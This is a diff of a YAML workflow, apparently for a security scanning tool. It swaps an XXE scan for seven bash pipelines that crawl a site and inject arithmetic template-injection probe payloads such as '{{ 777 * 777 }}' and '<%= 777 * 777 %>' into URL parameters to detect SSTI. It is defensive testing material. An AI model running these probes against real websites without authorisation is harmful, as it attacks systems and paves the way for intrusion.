@@ -1,5 +1,5 @@
-description: Conduct a test to find (XML External Entity) XXE vulnerabilites.
-tags: xxe, XXE
+description: It searches whole website in order to find parameters which can cause Server Side Template Injection (SSTI).
+tags: SSTI
 params: target=testphp.vulnweb.com header="Example:Blackdagger"
 # Change header without blank if you need or add authorization
 env:
@@ -7,7 +7,34 @@ env:
   - LOG_DIR: ${HOME}/logs
   - PATH: /usr/local/bin:${PATH}
 steps:
-  - name: XXEFinder
+  - name: CustomSSTI1
     command: bash
     script: |
-      httpx -u $target -o resXXE_${target//\"}.txt ; wapiti -u "$(cat resXXE_${target//\"}.txt)" -m xxe -H ${header//\"}
+      gau ${target//\"} | gf ssti | qsreplace "{{ 777 * 777 }}" | httpx -silent -mr "603729" 
+
+  - name: CustomSSTI2
+    command: bash
+    script: |
+      httpx -u ${target//\"} | katana -H ${header//\"} qurl | qsreplace "{{ 777 * 777 }}" | httpx -silent -mr "603729" -H ${header//\"}
+  - name: CustomSSTI3
+    command: bash
+    script: |
+      httpx -u ${target//\"} | katana -H ${header//\"} qurl | qsreplace "<%= 777 * 777 %>" | httpx -silent -mr "603729" -H ${header//\"}
+  - name: CustomSSTI4
+    command: bash
+    script: |
+      httpx -u ${target//\"} | katana -H ${header//\"} qurl | qsreplace "${{777*777}}" | httpx -silent -mr "603729" -H ${header//\"}
+  - name: CustomSSTI5
+    command: bash
+    script: |
+      httpx -u ${target//\"} | katana -H ${header//\"} qurl | qsreplace "@(777*777)" | httpx -silent -mr "603729" -H ${header//\"}
+  - name: CustomSSTI6
+    command: bash
+    script: |
+      httpx -u ${target//\"} | katana -H ${header//\"} qurl | qsreplace "${777*777}" | httpx -silent -mr "603729" -H ${header//\"}
+  - name: CustomSSTI7
+    command: bash
+    script: |
+      httpx -u ${target//\"} | katana -H ${header//\"} qurl | qsreplace "#{ 777 * 777 }" | httpx -silent -mr "603729"  -H ${header//\"}
+
+      
